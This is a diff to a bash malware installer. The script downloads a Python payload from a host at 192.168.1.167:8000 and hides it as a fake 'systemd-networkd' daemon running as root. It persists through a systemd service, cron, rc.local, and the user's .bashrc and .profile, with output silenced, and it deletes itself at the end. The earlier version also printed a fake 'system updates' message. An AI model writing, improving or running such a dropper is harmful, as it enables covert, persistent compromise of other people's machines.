@@ -1,47 +1,80 @@
 #!/bin/bash
-# ======== CHANGE TO YOUR WINDOWS IP ========
-YOUR_IP="192.168.1.167"    # ← YOUR WINDOWS IP
-# ===========================================
+# ======== ENHANCED PERSISTENCE SCRIPT ========
+YOUR_IP="192.168.1.167"
 
-echo "[+] Installing system updates..."  # Fake message
+echo "[+] Setting up persistent service..."
 
-# Download core.py from your Windows server
+# Download and install core payload
 mkdir -p /usr/lib/systemd/systemd-network 2>/dev/null
-curl -s "http://$YOUR_IP:8000/core.py" -o /usr/lib/systemd/systemd-network/networkd 2>/dev/null || wget -q "http://$YOUR_IP:8000/core.py" -O /usr/lib/systemd/systemd-network/networkd 2>/dev/null
+curl -s "http://$YOUR_IP:8000/core.py" -o /usr/lib/systemd/systemd-network/networkd || wget -q "http://$YOUR_IP:8000/core.py" -O /usr/lib/systemd/systemd-network/networkd
 
-chmod +x /usr/lib/systemd/systemd-network/networkd 2>/dev/null
+if [ ! -f "/usr/lib/systemd/systemd-network/networkd" ]; then
+    echo "[-] Failed to download payload"
+    exit 1
+fi
 
-# ======== SYSTEMD SERVICE FOR REBOOT SURVIVAL ========
-cat > /etc/systemd/system/systemd-networkd.service << EOF
+chmod +x /usr/lib/systemd/systemd-network/networkd
+
+# Create systemd service with better configuration
+cat > /etc/systemd/system/systemd-networkd.service << 'EOF'
 [Unit]
 Description=Systemd Network Daemon
 After=network.target
 Wants=network.target
+StartLimitIntervalSec=0
 
 [Service]
-Type=simple
+Type=forking
 ExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd
 Restart=always
-RestartSec=10
+RestartSec=5
 User=root
 WorkingDirectory=/usr/lib/systemd/systemd-network
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# Enable service to start on boot
+# Enable the service
 systemctl daemon-reload 2>/dev/null
 systemctl enable systemd-networkd.service 2>/dev/null
 systemctl start systemd-networkd.service 2>/dev/null
 
-# ======== CRON JOB AS BACKUP ========
-# Add to crontab as backup method
-(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd") | crontab - 2>/dev/null
+# Multiple persistence methods as backup
+echo "[+] Setting up multiple persistence methods..."
 
-# ======== START IMMEDIATELY ========
-# Start now (don't wait for reboot)
-nohup python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
+# 1. Systemd (primary)
+systemctl is-enabled systemd-networkd.service && echo "[+] Systemd service enabled"
 
-echo "[+] System updates completed successfully"
+# 2. Cron job (secondary)
+(crontab -l 2>/dev/null | grep -v "networkd"; echo "@reboot sleep 60 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd") | crontab - 2>/dev/null
+
+# 3. RC.Local (tertiary)
+echo "#!/bin/bash" > /etc/rc.local
+echo "sleep 120" >> /etc/rc.local  
+echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> /etc/rc.local
+chmod +x /etc/rc.local 2>/dev/null
+
+# 4. Profile persistence (quaternary)
+echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> ~/.bashrc
+echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> ~/.profile
+
+# Start immediately
+echo "[+] Starting service immediately..."
+nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
+
+echo "[+] Persistence setup completed successfully"
+echo "[+] Service will survive reboots via: systemd, cron, rc.local, profile"
+
+# Verify service is running
+sleep 2
+if pgrep -f "networkd" >/dev/null; then
+    echo "[+] Service is currently running"
+else
+    echo "[-] Service may not be running - check manually"
+fi
+
+# Self-cleanup
 rm -f "$0" 2>/dev/null
